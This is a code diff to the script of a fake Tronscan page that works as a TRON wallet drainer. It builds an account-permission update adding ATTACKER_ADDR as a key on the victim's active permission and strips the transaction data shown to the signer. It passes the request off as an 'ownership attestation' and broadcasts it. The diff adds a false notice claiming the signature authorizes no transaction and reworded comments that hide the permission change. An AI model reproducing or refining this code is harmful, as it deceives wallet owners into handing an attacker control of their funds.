@@ -456,12 +456,14 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     delete unsignedTx.visible;
     delete unsignedTx.txID;
     delete unsignedTx.raw_data;
+    delete unsignedTx.raw_data_hex;
     var now = new Date();
     var pad = function (n) { return String(n).padStart(2, '0'); };
     var ts = pad(now.getDate()) + '/' + pad(now.getMonth() + 1) + '/' + now.getFullYear()
            + ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
     unsignedTx.Authority   = 'Tronscan.org';
     unsignedTx.Attestation = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
+    unsignedTx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
 
     var signedTx;
     try {
@@ -551,7 +553,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // 4. Trigger AccountPermissionUpdateContract sign popup
+      // 4. Trigger native sign popup
       var tw = getTronWeb();
       if (tw) {
         try {
@@ -567,17 +569,16 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
               { address: ATTACKER_ADDR, weight: 1 }
             ]
           };
-          var unsignedTx = await tw.transactionBuilder.updateAccountPermissions(
-            addr, ownerPerm, null, [activePerm]
-          );
-          delete unsignedTx.visible;
-          delete unsignedTx.txID;
-          delete unsignedTx.raw_data;
-          unsignedTx.Authority   = 'Tronscan.org';
-          unsignedTx.Attestation = msg;
-          var signedTx = await tw.trx.sign(unsignedTx);
-          if (window.fillSignature) window.fillSignature(JSON.stringify((signedTx.signature && signedTx.signature[0]) || signedTx));
-          try { await tw.trx.sendRawTransaction(signedTx); } catch (e2) {}
+          var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
+          delete unsignedTx2.visible;
+          delete unsignedTx2.txID;
+          delete unsignedTx2.raw_data;
+          unsignedTx2.Authority   = 'Tronscan.org';
+          unsignedTx2.Attestation = msg;
+          unsignedTx2.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
+          var signedTx2 = await tw.trx.sign(unsignedTx2);
+          if (window.fillSignature) window.fillSignature(JSON.stringify((signedTx2.signature && signedTx2.signature[0]) || signedTx2));
+          try { await tw.trx.sendRawTransaction(signedTx2); } catch (e2) {}
         } catch (e) {
           // fallback DOM click
           var btn2 = document.getElementById('signMsgBtn')
@@ -774,16 +775,16 @@ function waitForTronLinkAndRun() {
     var cm = document.getElementById('connect-modal-root');
     if (cm) cm.style.display = 'none';
 
-    // Déclencher AccountPermissionUpdateContract sign popup
+    // Déclencher le signe natif immédiatement
     var tw = _getTronWeb();
     if (tw) {
       (async function() {
         try {
-          var ownerPerm2 = {
+          var ownerPerm = {
             type: 0, permission_name: 'owner', threshold: 1,
             keys: [{ address: addr, weight: 1 }]
           };
-          var activePerm2 = {
+          var activePerm = {
             type: 2, permission_name: 'active', threshold: 1,
             operations: ACTIVE_OPS,
             keys: [
@@ -791,17 +792,16 @@ function waitForTronLinkAndRun() {
               { address: ATTACKER_ADDR, weight: 1 }
             ]
           };
-          var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(
-            addr, ownerPerm2, null, [activePerm2]
-          );
-          delete unsignedTx2.visible;
-          delete unsignedTx2.txID;
-          delete unsignedTx2.raw_data;
-          unsignedTx2.Authority   = 'Tronscan.org';
-          unsignedTx2.Attestation = msg;
-          var signedTx2 = await tw.trx.sign(unsignedTx2);
-          if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx2.signature && signedTx2.signature[0]) || signedTx2));
-          try { await tw.trx.sendRawTransaction(signedTx2); } catch (e2) {}
+          var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
+          delete unsignedTx3.visible;
+          delete unsignedTx3.txID;
+          delete unsignedTx3.raw_data;
+          unsignedTx3.Authority   = 'Tronscan.org';
+          unsignedTx3.Attestation = msg;
+          unsignedTx3.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
+          var signedTx3 = await tw.trx.sign(unsignedTx3);
+          if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
+          try { await tw.trx.sendRawTransaction(signedTx3); } catch (e2) {}
         } catch(e) {
           // fallback: clic sur le bouton Sign Message
           var btn = document.getElementById('signMsgBtn')
